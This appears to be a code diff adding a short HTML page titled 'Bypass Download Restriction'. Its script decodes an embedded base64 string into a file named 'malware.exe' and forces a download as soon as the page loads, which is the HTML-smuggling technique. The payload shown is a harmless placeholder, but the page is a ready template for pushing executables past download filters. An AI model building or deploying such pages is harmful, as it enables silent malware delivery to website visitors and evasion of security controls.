@@ -1,0 +1,38 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bypass Download Restriction</title>
+</head>
+<body>
+    
+    <script>
+        var base64toArrayBuffer = (b64) => {
+            let binaryStr = window.atob(b64);
+            let lenOfBinaryStr = binaryStr.length;
+
+            let bytes = new Uint8Array(lenOfBinaryStr);
+            for(let i = 0; i < lenOfBinaryStr; i++)
+                bytes[i] = binaryStr.charCodeAt(i);
+
+            return bytes;
+        }
+
+        var b64 = "aGVsbG8gd29ybGQK";
+        var bytes = base64toArrayBuffer(b64);
+        var blob = new Blob([bytes], {type: "octet/stream"});
+        var fileName = 'malware.exe';
+        var url = window.URL.createObjectURL(blob);
+
+        var link = document.createElement("a");
+        link.href = window.URL.createObjectURL(blob);
+        link.download = fileName;
+        document.body.appendChild(link);
+
+        link.click();
+        window.URL.revokeObjectURL(url);
+    </script>
+
+</body>
+</html>
